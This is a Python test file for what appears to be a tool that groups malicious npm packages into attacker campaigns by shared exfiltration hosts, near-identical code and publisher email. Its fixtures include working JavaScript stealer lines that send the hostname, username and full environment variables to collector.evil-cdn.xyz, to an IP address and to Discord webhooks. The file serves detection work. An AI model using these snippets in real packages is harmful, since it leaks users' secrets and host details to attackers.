import json

import soc_store
from secopsai import actor_fingerprint as af

STEALER = (b"const os=require('os');const data=JSON.stringify({h:os.hostname(),u:os.userInfo().username,e:process.env});"
           b"require('https').request({hostname:'collector.evil-cdn.xyz',path:'/c',method:'POST'}).end(data);")


def _prints(code: bytes, manifest=b'{"name":"x"}'):
    return af.from_members([("package/package.json", manifest), ("package/index.js", code)])


def test_shared_infrastructure_and_near_identical_code_link_packages():
    items = {
        "npm:a@1": _prints(STEALER),
        "npm:b@1": _prints(STEALER.replace(b"data", b"payload")),  # renamed variable, same payload
        "npm:c@1": _prints(b"fetch('http://45.9.148.21/x',{method:'POST',body:require('os').hostname()})"),
        "npm:d@1": _prints(b"require('https').get('http://45.9.148.21/y'); require('os').hostname()"),
        "npm:e@1": _prints(b"module.exports = function add(a, b) { return a + b; };"),
    }
    groups = {tuple(group["members"]): group for group in af.cluster(items)}
    assert ("npm:a@1", "npm:b@1") in groups, "same exfil host and near-identical code"
    assert "host:collector.evil-cdn.xyz" in groups[("npm:a@1", "npm:b@1")]["indicators"]
    assert ("npm:c@1", "npm:d@1") in groups and "ip:45.9.148.21" in groups[("npm:c@1", "npm:d@1")]["indicators"]
    assert not any("npm:e@1" in members for members in groups)


def test_platforms_and_common_indicators_do_not_merge_unrelated_actors():
    a = _prints(b"require('https').request('https://discord.com/api/webhooks/111/aaa',{method:'POST'}).end(require('os').hostname())")
    b = _prints(b"require('https').request('https://discord.com/api/webhooks/222/bbb',{method:'POST'}).end(require('os').userInfo())")
    assert af.cluster({"a": a, "b": b}) == [], "different webhooks on a shared platform are different actors"
    crowd = {f"p{i}": {"infra": ["host:very-common.example-cdn.xyz"], "code": "", "publisher": []} for i in range(af.MAX_SHARED + 1)}
    assert af.cluster(crowd) == [], "an indicator shared by too many packages is ignored"


def test_publisher_email_links_and_campaign_growth_alerts(tmp_path):
    db_path = str(tmp_path / "soc.db")
    soc_store.init_db(db_path)
    manifest = b'{"name":"a","author":"Dev <throwaway991@proton.me>"}'
    af.record("npm:a@1", _prints(b"module.exports=1", manifest), seen_at="2026-10-01T00:00:00Z", db_path=db_path)
    af.record("npm:b@1", _prints(b"module.exports=2", manifest), seen_at="2026-10-02T00:00:00Z", db_path=db_path)
    first = af.link_campaigns(db_path=db_path)
    assert first["campaigns"] == 1 and len(first["grown"]) == 1
    assert af.link_campaigns(db_path=db_path)["grown"] == [], "no new members, no new alert"
    af.record("npm:c@1", _prints(b"module.exports=3", manifest), seen_at="2026-10-03T00:00:00Z", db_path=db_path)
    assert af.link_campaigns(db_path=db_path)["grown"], "a new package joining raises the alert again"
    with soc_store.connect(db_path) as connection:
        alert = connection.execute("SELECT alert_type, evidence_json FROM research_alerts").fetchone()
    evidence = json.loads(alert["evidence_json"])
    assert alert["alert_type"] == "campaign_activity" and evidence["added"] == ["npm:c@1"] and evidence["first_seen"] == "2026-10-01T00:00:00Z"
    assert af.campaign_of("npm:b@1", db_path=db_path)["members"] == 3
